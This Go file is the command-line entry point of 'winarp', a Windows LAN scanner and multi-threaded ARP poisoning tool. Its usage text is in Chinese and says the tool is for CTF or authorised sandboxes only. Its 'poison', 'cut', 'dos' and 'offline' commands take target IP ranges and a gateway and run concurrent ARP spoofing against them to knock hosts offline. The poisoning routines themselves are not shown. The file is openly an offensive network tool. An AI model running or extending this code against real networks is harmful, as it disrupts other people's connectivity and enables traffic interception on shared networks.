package main

import (
	"flag"
	"runtime"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"time"
)

func usage() {
	fmt.Fprintf(os.Stderr, `winarp - Windows LAN scan + multi-thread ARP poison (CTF)

无参数启动: 中文原生桌面 GUI
命令行:
  winarp gui
  winarp ifaces
  winarp scan [-cidr ...] [-workers N]
  winarp cut -target 192.168.31.105-110 [-workers N]
  winarp poison -from 192.168.31.105 -to 192.168.31.110

说明:
  * 多目标时每个目标独立协程并发污染
  * 需要管理员 + Npcap
  * 仅用于 CTF/授权沙箱
`)
}

func main() {
	runtime.LockOSThread()
	if len(os.Args) == 1 {
		if err := runGUI(); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		return
	}
	cmd := strings.ToLower(os.Args[1])
	args := os.Args[2:]
	switch cmd {
	case "gui", "ui":
		if err := runGUI(); err != nil {
			fail(err)
		}
	case "help", "-h", "--help":
		usage()
	case "ifaces", "list":
		ifaces, err := listWindowsIfaces()
		if err != nil {
			fail(err)
		}
		ifaces = fillPcapNames(ifaces)
		for _, it := range ifaces {
			gw := "-"
			if it.Gateway != nil {
				gw = it.Gateway.String()
			}
			fmt.Printf("%s | ip=%s mask=%s mac=%s gw=%s pcap=%s\n", it.Description, it.IP, net.IP(it.Mask), it.MAC, gw, it.PcapName)
		}
	case "scan":
		fs := flag.NewFlagSet("scan", flag.ExitOnError)
		ifaceName := fs.String("iface", "", "adapter")
		cidr := fs.String("cidr", "", "cidr")
		workers := fs.Int("workers", 64, "workers")
		noName := fs.Bool("no-name", false, "disable name")
		_ = fs.Parse(args)
		iface, err := chooseIface(*ifaceName)
		if err != nil {
			fail(err)
		}
		hosts, err := scanLAN(iface, *cidr, *workers, 800*time.Millisecond, !*noName, 700*time.Millisecond)
		if err != nil {
			fail(err)
		}
		fmt.Printf("found %d\n", len(hosts))
		fmt.Printf("%-16s %-20s %-24s\n", "IP", "MAC", "NAME")
		for _, h := range hosts {
			fmt.Printf("%-16s %-20s %-24s\n", h.IP, h.MAC, h.Name)
		}
	case "poison", "cut", "dos", "offline":
		fs := flag.NewFlagSet("poison", flag.ExitOnError)
		ifaceName := fs.String("iface", "", "adapter")
		target := fs.String("target", "", "target/list/range")
		fromIP := fs.String("from", "", "from")
		toIP := fs.String("to", "", "to")
		gateway := fs.String("gateway", "", "gateway")
		intervalMs := fs.Int("interval", 1000, "interval ms")
		workers := fs.Int("workers", 32, "workers")
		oneWay := fs.Bool("one-way", false, "one way")
		noName := fs.Bool("no-name", false, "no name")
		_ = fs.Parse(args)
		targets, err := collectTargets(*target, *fromIP, *toIP)
		if err != nil {
			fail(err)
		}
		iface, err := chooseIface(*ifaceName)
		if err != nil {
			fail(err)
		}
		var gip net.IP
		if *gateway != "" {
			gip = net.ParseIP(*gateway)
			if gip == nil || gip.To4() == nil {
				fail(fmt.Errorf("invalid gateway"))
			}
		} else if iface.Gateway != nil {
			gip = iface.Gateway
		} else {
			fail(fmt.Errorf("gateway unknown"))
		}
		stop := make(chan struct{})
		sig := make(chan os.Signal, 1)
		signal.Notify(sig, os.Interrupt)
		go func() {
			<-sig
			close(stop)
		}()
		fmt.Printf("[*] multi-thread targets=%d workers=%d\n", len(targets), *workers)
		if err := poisonLoopConcurrent(iface, targets, gip.To4(), time.Duration(*intervalMs)*time.Millisecond, *oneWay, nil, !*noName, *workers, stop, func(s string) { fmt.Println(s) }); err != nil {
			fail(err)
		}
	default:
		usage()
		os.Exit(2)
	}
}

func fail(err error) {
	fmt.Fprintf(os.Stderr, "[-] %v\n", err)
	os.Exit(1)
}
